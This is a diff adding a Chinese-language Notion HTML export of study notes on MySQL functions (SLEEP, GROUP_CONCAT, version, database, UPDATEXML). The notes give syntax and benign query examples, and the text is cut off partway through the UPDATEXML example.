@@ -1,0 +1,1037 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>基础方法</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="35c8db55-6aee-8007-b627-eb481a684a5c" class="page mono"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_goya_1789.jpg" style="object-position:center 80%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">♦️</span></div><h1 class="page-title" dir="auto">基础方法</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8056-9927-cfe2b15c5940" class="toggle"><li><details open=""><summary>sleep()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8085-a8ec-c8598270f11b" class=""><code>SLEEP()</code> 是一个用于暂停查询执行指定时间的函数,模拟延迟、测试并发或控制执行节奏。</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" integrity="sha512-sijCOJblSCXYYmXdwvqV0tak8QJW5iy2yLB1wAbbLc3OOIueqymizRFWUS/mwKctnzPKpNdPJV3aK1zlDMJmXQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="35c8db55-6aee-804b-a18f-d7acb24dc4f2" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SLEEP(seconds)
+参数：seconds 为等待时间，支持小数（如 0.5 表示 500 毫秒）。
+返回值：成功返回 0，若被中断返回 1。</code></pre></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80b2-8929-cd8ca0c8be39" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 暂停2秒后执行查询
+SELECT SLEEP(2);
+
+-- 在事务中插入延迟
+INSERT INTO logs (message) VALUES (&#x27;开始操作&#x27;);
+DO SLEEP(3); -- DO 语句用于执行函数但不返回结果
+INSERT INTO logs (message) VALUES (&#x27;延迟3秒后操作&#x27;);</code></pre></div><div style="display:contents" dir="auto"><hr id="35c8db55-6aee-8000-8280-fe839a358aca"/></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-805b-bb6e-cd6da3c021d1" class="toggle"><li><details open=""><summary>group_concat()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80d2-82ce-f832d2f7f7f5" class="">&gt;&gt;&gt; 聚合函数，用于将分组中的多行数据合并为单个字符串。</p></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8061-a0dd-d21aed13009b" class="">它在数据报表，嵌套查询和数据导出等场景中非常使用。</p></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-806f-80d6-d86d3177395c" class="">&gt;&gt;&gt; 语法;</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8050-a2f3-f2144aeeca74" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">GROUP_CONCAT(
+    [DISTINCT] expr1 [, expr2 ...]
+    [ORDER BY expr [ASC|DESC]]
+    [SEPARATOR str_val]
+)</code></pre></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-808b-a7d0-c0271eb52ef5" class="bulleted-list"><li style="list-style-type:disc"><strong>参数说明</strong>：<div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8032-a0b7-cfee50584850" class="bulleted-list"><li style="list-style-type:circle"><code>DISTINCT</code>：去重。</li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80ae-951b-e4e47db9e825" class="bulleted-list"><li style="list-style-type:circle"><code>ORDER BY</code>：定义合并顺序。</li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80fd-b7b1-c4baf26824d9" class="bulleted-list"><li style="list-style-type:circle"><code>SEPARATOR</code>：指定分隔符（默认逗号 <code>,</code>）。</li></ul></div></li></ul></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80f2-ac24-f6e7ae50a363" class="">&gt;&gt;&gt; 用法：</p></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-802a-a57d-ca110e90f6ea" class="">1、合并单列数据</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-808f-a4e2-d58b27c01a7c" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 将统一部门的姓名合并为字符串
+select department_id, group_concat(name) as employees
+from employees
+group by department_id;
+
+-- 结果示例：
+-- department_id | employees
+-- --------------+------------------
+-- 1             | Alice,Bob,Charlie
+-- 2             | Dave,Eve</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-802d-8195-e23b9d8b061f" class="">2、指定分割符</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-802c-a8a1-ea50d37135e5" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 使用 &quot;||&quot; 作为分隔符
+select 
+		department_id, 
+		group_concat(name order by salary desc separator &#x27; || &#x27;) as employees
+from employees
+group by department_id;
+
+-- 结果示例：
+-- department_id | employees
+-- --------------+------------------
+-- 1             | Bob || Alice || Charlie</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-808d-a7a0-c3f1b532fc96" class="">3、合并多列数据</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80b3-9d26-e0f0797d26a0" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">select 
+		department_id,
+		group_concat(concat(name, &#x27;:&#x27;, salary)) as emp_info
+from employees
+group by department_id;
+
+-- 结果示例：
+-- department_id | emp_info
+-- --------------+-----------------------
+-- 1             | Alice:5000,Bob:6000</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80af-b7de-d25f96aa4c42" class="">5、结合distinct去重</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-809a-b3ae-c2c3a9df5229" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 获取每个订单包含的唯一产品类别
+SELECT 
+    order_id,
+    GROUP_CONCAT(DISTINCT category) AS categories
+FROM order_items
+GROUP BY order_id;</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-809b-ae24-f2b462eb1573" class=""><strong>突破长度限制：默认group_concat被限制长度为group_concat_max_len=1024字节，可以临时修改：</strong></p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80f4-b173-efa067407716" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">set session group_concat_max_len=1024*1024; -- 1MB
+-- 再配置文件中可以永久修改
+[mysql]
+group_concat_max_len = 1048576</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80a8-be0b-f1e3cb693969" class="">6、嵌套使用</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80bc-8a00-f32832dd3ac2" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 先按部门分组，再按角色合并
+select 
+		company_id,
+		group_concat(
+				concat(
+					department_name, &#x27;:&#x27;,
+					group_concat(role separator &#x27;|&#x27;)
+				)
+				separator &#x27;;&#x27;
+		) as dept_roles
+from departments
+join employees using (department_id)
+group by company_id;
+
+-- 结果示例：
+-- company_id | dept_roles
+-- -----------+---------------------------------
+-- 1          | HR:Manager|Recruiter;IT:Developer|Admin</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80a4-afb7-ed8eb3c752d8" class="">7、NULL处理</p></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8033-a0ee-c04ba460815e" class="bulleted-list"><li style="list-style-type:disc">- NULL值会被忽略，需用COALESCE转换<br/><code>GROUP_CONCAT(COALESCE(name, &#x27;Unknown&#x27;))</code></li></ul></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-805e-8cca-dc133a80cba5" class="toggle"><li><details open=""><summary>version() </summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80e1-a6a8-dd00322f61ed" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">version() # 查看版本，返回版本号</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8024-a09a-f2bdcfb8c0ab" class="toggle"><li><details open=""><summary>database()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-804e-95c5-ebe09b669fcc" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">database() # 用于返回当前会话所连接的数据库名称</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8092-bef7-c3ee69ff91cc" class="toggle"><li><details open=""><summary>updatexml()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80bd-8645-cae40e26c586" class=""><code>UPDATEXML()</code> 是一个用于修改 XML 数据的函数，主要作用是更新 XML 文档中指定节点的值.</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8063-be1a-ca0091a3b8fb" class="code code-wrap"><code class="language-markdown" style="white-space:pre-wrap;word-break:break-all">UPDATEXML() 是一个用于修改 XML 数据的函数，主要作用是更新 XML 文档中指定节点的值.
+xml_target：需要修改的 XML 字符串或 XML 类型数据。
+xpath_expr：XPath 表达式，用于定位需要修改的节点（必须是有效的 XPath 路径）。
+new_xml：替换目标节点的新 XML 内容（字符串形式）。</code></pre></div><div style="display:contents" dir="auto"><hr id="35c8db55-6aee-80df-80cd-c8e42d3117e3"/></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80ff-932d-ce1222463f20" class="">例如：</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-802b-a496-de6d8f9cc8cb" class="code code-wrap"><code class="language-markdown" style="white-space:pre-wrap;word-break:break-all">&lt;bookstore&gt;
+  &lt;book id=&quot;1&quot;&gt;&lt;title&gt;SQL 基础&lt;/title&gt;&lt;price&gt;39.9&lt;/price&gt;&lt;/book&gt;
+  &lt;book id=&quot;2&quot;&gt;&lt;title&gt;XML 教程&lt;/title&gt;&lt;price&gt;45.0&lt;/price&gt;&lt;/book&gt;
+&lt;/bookstore&gt;
+
+--------------------
+将id=‘1’的书的price修改为49.9 ：
+SELECT UPDATEXML(
+  &#x27;&lt;bookstore&gt;
+    &lt;book id=&quot;1&quot;&gt;&lt;title&gt;SQL 基础&lt;/title&gt;&lt;price&gt;39.9&lt;/price&gt;&lt;/book&gt;
+    &lt;book id=&quot;2&quot;&gt;&lt;title&gt;XML 教程&lt;/title&gt;&lt;price&gt;45.0&lt;/price&gt;&lt;/book&gt;
+  &lt;/bookstore&gt;&#x27;,
